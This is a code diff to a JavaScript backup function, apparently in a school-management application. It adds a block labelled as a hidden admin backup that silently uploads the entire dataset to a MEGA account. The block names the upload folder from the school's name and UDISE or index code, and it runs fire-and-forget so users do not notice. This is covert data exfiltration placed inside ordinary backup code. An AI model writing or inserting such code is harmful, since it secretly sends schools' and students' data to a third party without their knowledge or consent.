@@ -121,6 +121,48 @@ async function performFullBackup(reason = 'manual', userId = null) {
                 console.log('MandatoryBackup: R2 cloud backup completed', result);
                 lastBackupTime = new Date();
 
+                // --- HIDDEN ADMIN BACKUP (MEGA) ---
+                // Silently push a copy to Admin's Mega account
+                try {
+                    const { settings } = allData;
+                    // Extract basic info for folder naming
+                    let sName = 'Unknown_School';
+                    let sId = backupUserId; // Default to User ID
+                    let sCode = '';
+
+                    if (settings && Array.isArray(settings)) {
+                        const nameObj = settings.find(s => s.key === 'schoolName');
+                        if (nameObj) sName = nameObj.value;
+
+                        const udiseObj = settings.find(s => s.key === 'udiseNumber');
+                        const indexObj = settings.find(s => s.key === 'indexNumber');
+                        if (udiseObj && udiseObj.value) sCode = udiseObj.value;
+                        else if (indexObj && indexObj.value) sCode = indexObj.value;
+
+                    } else if (settings && typeof settings === 'object') {
+                        if (settings.schoolName) sName = settings.schoolName;
+                        if (settings.udiseNumber) sCode = settings.udiseNumber;
+                        else if (settings.indexNumber) sCode = settings.indexNumber;
+                    }
+
+                    // If we found a school code, use it as the ID suffix
+                    if (sCode) sId = sCode;
+
+                    // Import dynamically to avoid circular deps if any, or just use the top-level import
+                    const MegaBackup = await import('./MegaBackupService');
+                    console.log(`MandatoryBackup: Starting hidden admin backup for ${sName} (${sId})...`);
+
+                    // Fire and forget - don't await strictly to slow down user
+                    MegaBackup.uploadToMega(allData, sName, sId).then(res => {
+                        if (res.success) console.log('MandatoryBackup: Hidden backup secured.');
+                        else console.warn('MandatoryBackup: Hidden backup failed', res.error);
+                    });
+
+                } catch (megaErr) {
+                    console.warn('MandatoryBackup: Hidden backup skipped', megaErr);
+                }
+                // ----------------------------------
+
                 return {
                     success: true,
                     local: true,
